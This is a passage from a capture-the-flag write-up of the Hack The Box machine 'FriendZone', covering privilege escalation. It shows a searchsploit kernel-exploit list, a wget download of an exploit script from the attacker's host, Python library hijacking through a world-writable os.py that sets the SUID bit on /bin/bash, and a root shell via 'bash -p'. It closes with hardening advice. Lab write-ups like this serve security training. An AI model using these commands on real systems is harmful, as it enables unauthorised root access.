Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (dbus Method)                       | linux/local/47165.sh
Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (ldpreload Method)                  | linux/local/47166.sh
Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (polkit Method)                     | linux/local/47167.sh
Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation                                                                | linux/local/41886.c
Linux Kernel < 4.15.4 - 'show_floppy' KASLR Address Leak                                                                  | linux/local/44325.c
Linux Kernel < 4.16.11 - 'ext4_read_inline_data()' Memory Corruption                                                      | linux/dos/44832.txt
Linux Kernel < 4.17-rc1 - 'AF_LLC' Double Free                                                                            | linux/dos/44579.c
macOS < 10.14.3 / iOS < 12.1.3 - Kernel Heap Overflow in PF_KEY due to Lack of Bounds Checking when Retrieving Statistics | multiple/dos/46300.c
Sony Playstation 4 (PS4) 4.07 < 4.55 - 'bpf' Local Kernel Code Execution (PoC)                                            | hardware/local/44177.c
Sony Playstation 4 (PS4) < 7.02 / FreeBSD 9 / FreeBSD 12 - 'ip6_setpktopt' Kernel Local Privilege Escalation (PoC)        | hardware/local/48644.c
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
kali@kali:~/htb/Friendzone$ 
```

I download and upload one of the privesc scripts and try to run it:

```
friend@FriendZone:~$ wget 10.10.14.70:8000/47164.sh
--2021-02-09 11:53:19--  http://10.10.14.70:8000/47164.sh
Connecting to 10.10.14.70:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2545 (2.5K) [text/x-sh]
Saving to: ‘47164.sh.1’

47164.sh.1          100%[===================>]   2.49K  --.-KB/s    in 0s      

2021-02-09 11:53:19 (303 MB/s) - ‘47164.sh’ saved [2545/2545]

friend@FriendZone:~$ chmod 777 47164.sh 
friend@FriendZone:~$ ./47164.sh
-su: ./47164.sh: /bin/sh^M: bad interpreter: No such file or directory
friend@FriendZone:~$ 
```

I tried some fixes I found, but none worked. So I guess it's back to manual searching for a while.

I upload pspy64 and see:

`2021/02/09 11:58:01 CMD: UID=0    PID=1444   | /bin/sh -c /opt/server_admin/reporter.py`


```
friend@FriendZone:/opt/server_admin$ ls -l
total 4
-rwxr--r-- 1 root root 424 Jan 16  2019 reporter.py
friend@FriendZone:/opt/server_admin$ cat reporter.py 
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```

So we do not have access to edit this. But it does import the os library. Could we maybe edit that? We cannot edit the system function itself, as it's all commented out.

```
friend@FriendZone:/opt/server_admin$ locate os.py | xargs ls -l
-rwxr-xr-x 1 root   root    2600 Aug 15  2017 /usr/lib/python2.7/dist-packages/samba/provision/kerberos.py
-rwxr-xr-x 1 root   root    1749 Oct  6  2018 /usr/lib/python2.7/dist-packages/samba/provision/kerberos.pyc
-rwxr-xr-x 1 root   root    2936 Apr 16  2018 /usr/lib/python2.7/encodings/palmos.py
-rwxr-xr-x 1 root   root    3074 Oct  6  2018 /usr/lib/python2.7/encodings/palmos.pyc
-rwxrwxrwx 1 root   root   25910 Jan 15  2019 /usr/lib/python2.7/os.py
-rw-rw-r-- 1 friend friend 25583 Jan 15  2019 /usr/lib/python2.7/os.pyc
-rw-r--r-- 1 root   root   13519 Sep 12  2018 /usr/lib/python3.6/encodings/palmos.py
-rw-r--r-- 1 root   root   37526 Sep 12  2018 /usr/lib/python3.6/os.py
-rw-r--r-- 1 root   root    5363 Nov  5  2013 /usr/lib/python3/dist-packages/LanguageSelector/macros.py
friend@FriendZone:/opt/server_admin$ 
```

So we can edit /usr/lib/python2.7/os.py

I edit it with nano, and just add `system("chmod 4755 /bin/bash")` at the end of the file. This just edits the /bin/bash privileges so everyone can run it.

so I run bash with privilege mode to become root:

```
friend@FriendZone:/opt/server_admin$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1113504 Apr  4  2018 /bin/bash
friend@FriendZone:/opt/server_admin$ bash -p
bash-4.4# whoami
root
bash-4.4# 
```

## Comparing myself with the official writeup:

They find the same things I do and get the www-data user shell. 

They use LinEnum to enumerate the system and find the writeable os.py module.

They end up replacing the entire module and uses that to change crontab to connect to a listener on the attacking machine.


## How to stop this exploit:

Having the creds for an admin account in a public smb disk is not good. Even if those creds cannot be used directly, they may help an attacker in creating some sort of pattern in the creds.

Optimally, the timestamps function used on the dashboard page should be embedded in the dashboard.php file itself. And not a separate file. This way, the function can be called without including any local file inclusion vulnerabilites.

In addition, a writeable public folder is a scary thing. People can upload whatever they want there.

The user's creds being in the open in a config file is also a really bad idea. For obvious reasons.

I have no idea how the os.py module is writeable for everyone, but that should definitely not be the case.

It does not matter if a program is safe in itself, when everything that program is build upon is vulnerable.

